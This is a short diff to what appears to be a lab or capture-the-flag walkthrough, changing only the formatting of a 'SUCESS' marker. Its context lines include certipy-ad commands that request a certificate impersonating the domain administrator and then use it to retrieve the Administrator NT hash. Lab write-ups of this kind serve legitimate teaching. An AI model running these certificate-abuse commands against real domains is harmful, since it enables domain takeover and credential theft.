@@ -813,7 +813,7 @@ If you are not aware, it is sometimes possible to extract valid domain usernames
     -   `certipy-ad req -username $user@$domain -password $pass -ca sequel-DC-CA -target ca.$domain -template UserAuthentication -upn administrator@$domain -dns dc.$domain`
         -   {{< figure src="/ox-hugo/2024-10-05-150245_.png" >}}
         -   +Note+: How we have used the name of the certificate we found in step 1 `UserAuthentication`
-        -   ~~!!!SUCESS!!!~~
+        -   +!!!SUCESS!!!+
 
 4.  **I request to authenticate as the Administrator and retrieve the Administrator NT hash &amp; creds stored in** `.ccache`:
     -   `certipy-ad auth -pfx administrator_dc.pfx -dc-ip $box`
